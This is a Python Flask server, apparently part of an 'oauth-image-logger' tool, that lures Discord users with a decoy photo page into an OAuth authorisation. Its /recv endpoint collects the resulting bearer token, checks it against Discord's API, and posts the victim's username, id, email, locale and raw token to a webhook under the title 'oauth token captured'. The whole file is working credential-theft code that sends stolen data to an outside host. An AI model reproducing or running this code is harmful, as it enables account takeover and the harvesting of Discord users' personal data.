# language: Python, file: oauth-image-logger/server/app.py
# serves /photo and /cb, receives /recv, validates the OAuth token, posts to webhook

import os, sys, requests
from flask import Flask, request, Response, redirect, send_from_directory

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, os.path.join(ROOT, "config"))
import settings  # noqa: E402

STATIC = os.path.join(ROOT, "static")
app = Flask(__name__, static_folder=None)

def render(name, repl):
    with open(os.path.join(STATIC, name), "r", encoding="utf-8") as f:
        html = f.read()
    for k, v in repl.items():
        html = html.replace("{{" + k + "}}", v)
    return Response(html, mimetype="text/html")

@app.route("/")
def root():
    return redirect("/photo")

@app.route("/photo")
def photo():
    return render("photo.html", {
        "CLIENT_ID":    settings.CLIENT_ID,
        "REDIRECT_URI": settings.REDIRECT_URI,
        "COVER_URL":    settings.COVER_URL,
        "SCOPES":       settings.SCOPES,
        "DELAY":        str(settings.COVER_DELAY_MS),
    })

@app.route("/cb")
def cb():
    return render("cb.html", {})

@app.route("/recv")
def recv():
    tok = request.args.get("t", "").strip()
    if not tok:
        return ("", 204)

    # validate token against Discord
    try:
        me = requests.get(
            "https://discord.com/api/v10/users/@me",
            headers={"Authorization": "Bearer " + tok},
            timeout=8,
        ).json()
    except Exception as e:
        me = {"error": str(e)}

    ok = "id" in me and "username" in me
    if ok:
        tag = f"#{me['discriminator']}" if me.get("discriminator") not in (None, "0") else ""
        desc = (
            f"**{me['username']}{tag}**\n"
            f"id: `{me['id']}`\n"
            f"email: `{me.get('email', 'n/a')}`\n"
            f"verified: `{me.get('verified', 'n/a')}`\n"
            f"locale: `{me.get('locale', 'n/a')}`\n"
            f"```\nBearer {tok}\n```"
        )
        color = 0x5865F2
        title = "oauth token captured"
    else:
        desc = "```json\n" + str(me)[:3800] + "\n```"
        color = 0xED4245
        title = "oauth token invalid"

    try:
        requests.post(settings.WEBHOOK, json={"embeds": [{
            "title": title,
            "description": desc,
            "color": color,
        }]}, timeout=8)
    except Exception:
        pass

    return ("", 204)

if __name__ == "__main__":
    print(f"[+] listening on http://{settings.HOST}:{settings.PORT}")
    print(f"[+] photo  : /photo")
    print(f"[+] cb     : /cb")
    print(f"[+] redirect_uri registered in portal must equal: {settings.REDIRECT_URI}")
    app.run(host=settings.HOST, port=settings.PORT, debug=False)